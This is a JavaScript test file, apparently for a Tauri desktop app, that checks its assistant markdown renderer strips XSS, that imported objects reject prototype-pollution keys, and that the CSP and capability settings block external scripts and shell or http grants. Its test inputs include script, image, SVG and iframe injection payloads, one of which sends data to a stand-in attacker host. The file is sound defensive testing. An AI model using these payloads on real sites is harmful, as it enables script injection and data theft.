import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { JSDOM } from "jsdom";
import { renderAssistantMarkdown } from "../src/features/workspace/assistant.js";
import { safeObject } from "../src/features/workspace/changes.js";

test("untrusted assistant text cannot create executable HTML or load tracking images", () => {
  const dom = new JSDOM("<main></main>");
  const host = dom.window.document.querySelector("main");
  renderAssistantMarkdown(
    host,
    [
      '<script>fetch("https://evil.invalid/?data=private")</script>',
      '<img src="https://evil.invalid/pixel" onerror="alert(1)">',
      '<svg onload="alert(1)"><foreignObject>attack</foreignObject></svg>',
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      "[script](javascript:alert(1))",
      "[file](file:///C:/private.txt)",
      "[credentials](https://password@evil.invalid/)",
      "[safe](https://example.org/)",
    ].join("\n"),
  );
  assert.equal(
    host.querySelectorAll("script,img,svg,iframe,object,embed,form").length,
    0,
  );
  const links = [...host.querySelectorAll("a")];
  assert.equal(links.length, 1);
  assert.equal(links[0].href, "https://example.org/");
  assert.equal(links[0].rel, "noopener noreferrer");
  for (const element of host.querySelectorAll("*"))
    assert.equal(
      [...element.attributes].some((attr) => /^on/i.test(attr.name)),
      false,
    );
  dom.window.close();
});

test("nested imported prototype keys are rejected", () => {
  for (const key of ["__proto__", "constructor", "prototype"])
    assert.equal(
      safeObject(
        JSON.parse(`{"records":[{"nested":{"${key}":{"polluted":true}}}]}`),
      ),
      false,
    );
  assert.equal(Object.prototype.polluted, undefined);
  assert.equal(
    safeObject({ body: "<script>shown as plain text</script>" }),
    true,
  );
});

test("packaged frontend does not allow external scripts, forms or remote IPC grants", () => {
  const config = JSON.parse(
    readFileSync(new URL("../src-tauri/tauri.conf.json", import.meta.url)),
  );
  const csp = config.app.security.csp;
  assert.match(csp, /script-src 'self';/);
  assert.doesNotMatch(csp, /unsafe-eval/);
  assert.match(csp, /form-action 'none'/);
  assert.match(csp, /frame-src 'none'/);
  assert.match(csp, /base-uri 'none'/);
  const capabilities = JSON.parse(
    readFileSync(
      new URL("../src-tauri/capabilities/default.json", import.meta.url),
    ),
  );
  assert.equal(capabilities.remote, undefined);
  assert.equal(
    capabilities.permissions.some(
      (p) => typeof p === "string" && /shell:|http:/.test(p),
    ),
    false,
  );
});
